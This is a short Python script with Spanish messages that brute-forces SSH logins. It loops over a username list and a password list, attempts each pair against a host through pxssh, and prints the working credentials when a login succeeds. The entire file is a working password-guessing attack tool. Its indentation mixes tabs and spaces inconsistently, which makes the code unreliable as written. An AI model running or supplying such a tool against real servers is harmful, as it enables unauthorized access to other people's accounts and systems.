from pexpect import pxssh

host="127.0.0.1"
intentos=0
def conectar(user,passw):
    try:
        conectar=pxssh.pxssh()
        conectar.login(host,user,passw)
        print "Login correcto"
	print "Usuario: ",user
	print "Clave: ",passw
        return True
    except:
        print "Login fallido"
        return False

with open('usuarios.txt','r') as reader1:
	for usuario in reader1:
            with open('passwords.txt','r') as reader2:
	    	for password in reader2:
			usuario = usuario.rstrip('\r\n')
			password = password.rstrip('\r\n')
	       		if conectar(usuario,password)==True:
				print "Usuario y clave encontrados (",intentos," errores )"
				exit()
			else:
				intentos=intentos+1
				print "Reintentando (intento numero ",intentos,")"
